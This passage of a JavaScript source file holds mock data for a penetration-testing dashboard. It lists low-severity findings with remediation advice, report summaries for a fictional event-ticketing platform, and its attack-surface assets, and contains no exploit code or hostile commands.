    { id: fid(), title: 'Missing API Documentation', severity: 'low', status: 'open', cvss_score: 3.1, cwe_id: 'CWE-1059', owasp_category: 'A09:2021', affected_url: `${BASE}/api`, description: 'No OpenAPI/Swagger documentation exists. Multiple undocumented endpoints were discovered that are not covered by security controls.', remediation: { priority: 'low', description: 'Generate API documentation using rswag. Include security requirements for each endpoint.' } },
    { id: fid(), title: 'CORS Too Permissive', severity: 'low', status: 'open', cvss_score: 3.7, cwe_id: 'CWE-942', owasp_category: 'A05:2021', affected_url: `${BASE}/api`, description: 'API CORS allows credentials from *.example.com origins which could include attacker-controlled subdomains.', remediation: { priority: 'low', description: 'Restrict CORS to exact production origin only.' } },
    { id: fid(), title: 'No Request ID Tracking in API', severity: 'info', status: 'open', cvss_score: null, cwe_id: 'CWE-778', owasp_category: 'A09:2021', affected_url: `${BASE}/api`, description: 'API responses lack a unique request ID header for tracing and incident correlation.', remediation: { priority: 'low', description: 'Add X-Request-Id header using ActionDispatch::RequestId middleware (enabled by default in Rails).' } },
  ],
}

export const DEMO_REPORTS = {
  'scan-001': [
    { id: 'report-001', report_type: 'executive_summary', status: 'generated', format: 'PDF', created_at: hours(18), executive_summary: { overview: 'The penetration test of the Demo Event platform (demo-events.example.com) revealed 35 vulnerabilities including 4 critical, 8 high, 11 medium, 7 low, and 5 informational findings. The most severe issues include SQL injection in event search filters, stored XSS in event descriptions, IDOR on ticket records, and an exposed Stripe secret key in client-side JavaScript. The payment flow has multiple critical weaknesses including amount tampering and race conditions. Immediate remediation is required for all critical and high-severity findings before the platform handles real financial transactions. Overall security posture: HIGH RISK (score: 82/100).' } },
    { id: 'report-002', report_type: 'technical_report', status: 'generated', format: 'PDF', created_at: hours(18) },
    { id: 'report-003', report_type: 'remediation_plan', status: 'generated', format: 'PDF', created_at: hours(17) },
  ],
  'scan-002': [
    { id: 'report-004', report_type: 'executive_summary', status: 'draft', format: 'PDF', created_at: hours(1), executive_summary: { overview: 'Ongoing red team assessment of the Demo Event REST/GraphQL API has identified 14 vulnerabilities so far, including 2 critical findings related to broken object-level authorization and mass assignment enabling free ticket creation. The API security posture requires significant hardening. Testing is 72% complete.' } },
  ],
}

export const DEMO_ATTACK_SURFACES = {
  'scan-001': {
    last_scanned_at: hours(20),
    assets: [
      { id: 'as-01', asset_type: 'domain', value: 'demo-events.example.com', technologies: ['Ruby on Rails 7.1', 'Hotwire/Turbo', 'Stimulus', 'Tailwind CSS 3.4'], status: 'active' },
      { id: 'as-02', asset_type: 'domain', value: 'staging.demo-events.example.com', technologies: ['Ruby on Rails 7.1', 'Hotwire/Turbo'], status: 'active' },
      { id: 'as-03', asset_type: 'subdomain', value: 'api.demo-events.example.com', technologies: ['Ruby on Rails 7.1', 'GraphQL', 'REST'], status: 'active' },
      { id: 'as-04', asset_type: 'subdomain', value: 'cdn.demo-events.example.com', technologies: ['AWS CloudFront', 'S3'], status: 'active' },
      { id: 'as-05', asset_type: 'subdomain', value: 'mail.demo-events.example.com', technologies: ['SendGrid'], status: 'active' },
      { id: 'as-06', asset_type: 'ip_address', value: '52.14.231.87', technologies: ['AWS EC2', 'nginx/1.24.0', 'Passenger'], status: 'active' },
      { id: 'as-07', asset_type: 'ip_address', value: '52.14.231.88', technologies: ['AWS RDS', 'PostgreSQL 15'], status: 'active' },
      { id: 'as-08', asset_type: 'ip_address', value: '52.14.231.89', technologies: ['AWS ElastiCache', 'Redis'], status: 'active' },
      { id: 'as-09', asset_type: 'endpoint', value: '/login', technologies: ['Devise', 'OAuth'], status: 'active' },
      { id: 'as-10', asset_type: 'endpoint', value: '/register', technologies: ['Devise'], status: 'active' },
      { id: 'as-11', asset_type: 'endpoint', value: '/events', technologies: ['Elasticsearch', 'Turbo Frames'], status: 'vulnerable' },
      { id: 'as-12', asset_type: 'endpoint', value: '/events/:id/register', technologies: ['Stripe', 'Turbo'], status: 'vulnerable' },
      { id: 'as-13', asset_type: 'endpoint', value: '/checkout', technologies: ['Stripe API'], status: 'vulnerable' },
      { id: 'as-14', asset_type: 'endpoint', value: '/webhooks/stripe', technologies: ['Stripe Webhooks'], status: 'vulnerable' },
      { id: 'as-15', asset_type: 'endpoint', value: '/dashboard', technologies: ['Turbo Frames'], status: 'active' },
      { id: 'as-16', asset_type: 'endpoint', value: '/dashboard/tickets/:id', technologies: ['QR Code'], status: 'vulnerable' },
      { id: 'as-17', asset_type: 'endpoint', value: '/organizer/events/new', technologies: ['Trix Editor', 'Turbo'], status: 'vulnerable' },
      { id: 'as-18', asset_type: 'endpoint', value: '/organizer/checkin', technologies: ['Camera API', 'QR Scanner'], status: 'active' },
      { id: 'as-19', asset_type: 'endpoint', value: '/api/graphql', technologies: ['GraphQL'], status: 'vulnerable' },
      { id: 'as-20', asset_type: 'endpoint', value: '/profile', technologies: ['Devise', 'Turbo'], status: 'vulnerable' },
    ],
  },
}
